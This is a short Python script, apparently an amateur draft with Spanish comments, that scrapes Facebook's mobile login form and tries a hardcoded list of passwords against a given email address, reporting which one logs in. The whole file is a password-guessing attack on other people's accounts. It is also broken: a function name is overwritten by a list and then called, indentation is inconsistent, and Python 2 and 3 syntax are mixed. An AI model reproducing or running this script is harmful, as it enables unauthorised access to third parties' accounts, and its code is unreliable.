import sys
import re

try:
    import requests

except ImportError:
    print "[!] Couldn't import requests"
    sys.exit()

if len(sys.argv) < 3:
    print "Usage: get_location.py target_username my_fb_emaild"
    print "Example get_location.py user.name user@gmail.com"
    sys.exit()

user = sys.argv[1]
username = sys.argv[2]

def get_graphID_user(s, username):
    """Get the Facebook graph api id from a user"""
    r = s.get("https://m.facebook.com/{user}".format(user=username))
    print (r)
    match = re.search(r'photo.php\?fbid=\d*&amp;id=(\d*)&', r.text)
    if match:
        graph_id = match.group(1)
        return graph_id
    else:
        return False

# Create session, and set the User-Agent
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"

def prueba(cont):
    if cont==1:
        print ("Llego al contado 1: ")
        #aqui en vez del print debo poner s.headers["User-Agent"] = "OTRO AGENTE USER"

# Retrieve the right parameters for the login
data = requests.get("https://m.facebook.com/").text
params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
for p in params.keys():
    match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), data)
    if match:
        params[p] = match.group(1)

# Set the important parameters

prueba=['admin','123','santin']
contador=0
while (contador <3):
	params['email'] = username
	params['pass'] = prueba[contador]
	params['login'] = 'Log In'

	# Login
	r = s.post(r"https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8", data=params)

	if '/recover/initiate/' in r.text:
	    print (prueba[contador],": Login Incorrecto!")
	    contador+=1
	else:
	    print (prueba[contador],": Login Correcto!")
	
    prueba(contador) # NO ME PERMITE CORRER AQUI O ASI PONGO SOLO EN IF CONTADOR ==1: PRINT (USER O PRINT LLEGO A 1)


